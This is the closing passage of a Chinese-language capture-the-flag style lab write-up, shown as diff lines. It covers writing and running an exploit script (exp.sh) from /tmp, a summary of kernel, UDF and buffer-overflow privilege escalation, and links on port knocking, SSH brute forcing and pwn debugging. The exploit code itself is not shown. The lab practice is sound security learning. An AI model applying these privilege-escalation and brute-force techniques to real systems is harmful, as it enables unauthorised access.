+    -size  ---表示文件大小
+    -type  ---文件类型
+    f 普通文件
+    
+    
+    cd /tmp //这个文件夹下有权限
+    nano exp.sh  vi exp.sh //都可以创建
+    
+
+![](https://image.3001.net/images/20220331/1648656278_62447f96cc1fe93fe1614.png!small)
+
+![](https://image.3001.net/images/20220331/1648656320_62447fc0eebb28d8e362d.png!small)
+
+    
+    
+    chmod +x exp.sh
+    ./exp.sh
+    
+
+![](https://image.3001.net/images/20220331/1648656297_62447fa9786759ebea2a1.png!small)
+
+### 总结
+
+本靶机 为综合练习 内核提权 udf提权 换缓冲区溢出提权，其中缓冲区溢出提权初步接触 比较不懂，也是看别人wrteup 复显过程才写好。
+
+    
+    
+    参考链接 
+    hping3 端口碰撞
+    https://blog.csdn.net/qq_30247635/article/details/86243448
+    
+    msf爆破ssh
+    https://blog.csdn.net/huweiliyi/article/details/105590291
+    
+    缓冲区溢出
+    https://blog.csdn.net/missmxr/article/details/121451920
+    
+    pwngdb使用
+    https://ch4r1l3.github.io/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/
+    
+    gdb与peda、pwngdb、pwndbg组合安装与使用
+    https://blog.csdn.net/whbing1471/article/details/112410599
+    
+    pwn环境搭建：
+    https://mambainveins.com/2021/07/23/2021/2021-07-23-pwn_env/
+    
+    初识缓冲区
+    https://isbase.cc/tip/exploit/tip-2.html
+    
+
